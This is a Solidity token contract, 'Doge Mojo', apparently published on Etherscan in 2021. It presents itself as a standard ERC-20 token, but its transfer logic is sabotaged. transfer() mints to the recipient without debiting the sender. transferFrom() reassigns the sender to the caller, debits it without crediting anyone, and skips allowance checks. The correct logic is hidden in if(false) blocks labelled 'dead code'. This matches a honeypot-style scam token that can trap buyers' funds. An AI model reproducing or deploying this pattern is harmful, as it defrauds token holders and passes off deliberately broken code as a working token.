pragma solidity >=0.4.24;
/**
 *Submitted for verification at Etherscan.io on 2021-06-12
*/
//SPDX-License-Identifier: UNLICENSED
contract DogeMojo {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 10 * 10**12 * 10**18;
    string public name = "Doge Mojo";
    string public symbol = "DOGEMOJO";
    uint public decimals = 18;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor() {
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    function balanceOf(address owner) public view returns(uint256) {
        return balances[owner];
    }
    function transfer(address to, uint256 value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        if(false)  // dead code
        {
//*        	require(true);
//*        	if(value < 10)
//*        	{
//*        		balances[msg.sender] -= value;
//*        	}
}
        emit Transfer(msg.sender, to, value);
        return true;
    }
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
    from = msg.sender;
    balances[from] -= value;
    if(from != msg.sender) // dead code
    {
//*        require(balanceOf(from) >= value, 'balance too low');
//*        require(allowance[from][msg.sender] >= value, 'allowance too low');
//*        balances[to] += value;
//*        balances[from] -= value;
//*        emit Transfer(from, to, value);
}   
        return true;
    }
    function approve(address spender, uint256 value) public returns(bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }
}
